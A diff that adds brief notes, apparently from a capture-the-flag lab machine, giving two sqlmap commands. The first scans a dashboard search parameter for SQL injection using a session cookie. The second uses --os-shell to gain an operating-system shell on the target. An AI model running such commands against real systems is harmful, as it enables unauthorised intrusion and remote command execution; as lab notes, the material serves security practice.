@@ -1,0 +1,10 @@
+
+
+Scan for SQL injection with php session cookie:
+sqlmap -u 'http://10.10.10.46/dashboard.php?search=a' --cookie="PHPSESSID=dudodhc3a5l1llae53mlkk5a5p"
+
+
+Open OS shell:
+sqlmap -u 'http://10.10.10.46/dashboard.php?search=a' --cookie="PHPSESSID=dudodhc3a5l1llae53mlkk5a5p" --os-shell
+
+
